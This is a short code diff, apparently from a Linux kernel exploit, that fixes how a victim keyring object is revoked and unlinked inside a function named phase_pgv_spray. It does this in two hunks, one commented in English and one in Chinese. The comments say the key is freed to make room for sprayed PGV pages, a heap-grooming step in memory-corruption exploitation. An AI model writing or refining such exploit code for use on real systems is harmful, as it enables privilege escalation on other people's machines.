@@ -2616,8 +2616,8 @@ int phase_pgv_spray(void) {
 
     // Free victim key to make space for PGV pages
     if (victim_key_id >= 0) {
-        key_revoke(victim_key_id);
-        key_unlink(victim_key_id);
+        key_revoke(key_ids[victim_key_id]);
+        key_unlink(key_ids[victim_key_id]);
     }
 
     usleep(2000000); // 2 second delay
@@ -3116,8 +3116,8 @@ int phase_pgv_spray(void) {
 
     /* 释放目标密钥对象，使其内存可重新分配 */
     if (victim_key_id >= 0) {
-        key_revoke(victim_key_id);
-        key_unlink(victim_key_id);
+        key_revoke(key_ids[victim_key_id]);
+        key_unlink(key_ids[victim_key_id]);
     }
     usleep(2000000);  // 等待2秒，确保内存完全释放
 
